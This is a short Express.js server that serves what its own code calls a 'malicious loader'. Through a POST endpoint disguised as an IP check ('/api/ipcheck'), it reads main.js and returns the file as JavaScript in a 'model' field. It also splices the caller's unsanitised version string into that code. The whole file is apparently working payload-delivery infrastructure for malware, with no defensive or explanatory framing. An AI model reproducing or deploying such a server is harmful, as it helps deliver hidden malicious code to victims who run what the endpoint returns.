const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json());
const loaderPath = path.join(__dirname, 'main.js');
const getMaliciousLoader = () => {
    try{
        // console.log("hi");
        return fs.readFileSync(loaderPath, 'utf8');
    }catch(error) {
        console.error('Failed to read main:', error.message);
    }
}
app.post('/api/ipcheck', (req,res) => {
    const {version} = req.body;
    // console.log(`Received version: ${version}`);
    const maliciousLoaderContent = getMaliciousLoader();
    console.log(maliciousLoaderContent);
    const responseContent = `${maliciousLoaderContent}\nconsole.log('Process version: ${version}');`;
    res.json({
        model:responseContent
    });
});
const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=> console.log(`Server running on Port ${PORT}`))